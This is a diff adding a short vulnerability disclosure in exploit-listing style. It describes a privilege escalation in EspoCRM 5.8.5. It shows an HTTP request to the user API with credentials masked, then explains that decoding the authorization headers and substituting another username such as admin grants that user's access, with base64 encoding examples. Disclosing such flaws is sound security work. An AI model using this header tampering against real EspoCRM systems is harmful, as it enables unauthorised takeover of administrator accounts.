@@ -1,0 +1,40 @@
+# Exploit Title: EspoCRM 5.8.5 - Privilege Escalation
+# Author: Besim ALTINOK
+# Vendor Homepage: https://www.espocrm.com
+# Software Link: https://www.espocrm.com/downloads/EspoCRM-5.8.5.zip
+# Version: v5.8.5
+# Tested on: Xampp
+# Credit: İsmail BOZKURT
+
+-------------
+
+Details:
+--------------------------------------------
+
+1- When we sent a request to the /api/v1/App/user, we can see user details
+---
+First Request:
+---------------------------
+GET /api/v1/App/user HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 *************************
+Authorization: Basic *************************************
+Espo-Authorization: *************************************
+Espo-Authorization-By-Token: true
+X-Requested-With: XMLHttpRequest
+DNT: 1
+Connection: close
+Cookie: auth-token-secret=cdc7f7*********************377;
+auth-username=user1; auth-token=3a874a********************************48
+----
+
+2- When we decode Basic Authorization and Espo-Authorization and change the
+value with another username (like admin)  in the first request, we can see
+other user information and access like BOSS
+----------
+
+3- Some Examples and encode technique
+
+- BASE64:
+First type: dXNlcjE6MQ== (user1:1)
+Second type: user1:MzNmYzYwZDQ1ZDI2YWNhODYxZTZlYjdiMDgwMjk4TkRn (user1:pass)
